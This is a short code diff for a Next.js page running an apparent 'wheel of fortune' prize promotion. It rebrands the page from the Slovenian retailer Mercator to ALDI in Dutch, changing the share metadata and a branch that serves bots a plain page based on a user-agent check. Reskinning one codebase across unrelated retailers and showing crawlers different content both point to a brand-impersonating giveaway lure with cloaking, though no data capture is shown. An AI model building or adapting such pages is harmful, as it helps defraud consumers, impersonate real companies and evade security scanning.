@@ -80,9 +80,9 @@ export const dynamic = "force-dynamic";
 
 export async function generateMetadata() {
   return buildShareMetadata({
-    title: "Mercator — Kolo Sreče",
+    title: "ALDI — Geluksrad",
     description:
-      "Mercator posebna akcija Kolo Sreče! Preizkusite svojo srečo in osvojite ekskluzivne nagrade.",
+      "ALDI speciale actie Geluksrad! Probeer uw geluk en win exclusieve prijzen.",
     canonical: "/",
   });
 }
@@ -104,10 +104,10 @@ export default async function Home({ searchParams }: Props) {
     if (BOT_UA.test(ua)) {
       return (
         <main>
-          <h1>Mercator — Kolo Sreče</h1>
+          <h1>ALDI — Geluksrad</h1>
           <p>
-            Mercator posebna akcija Kolo Sreče! Preizkusite svojo srečo in
-            osvojite ekskluzivne nagrade.
+            Speciale ALDI-actie Geluksrad! Probeer uw geluk en win exclusieve
+            prijzen.
           </p>
         </main>
       );
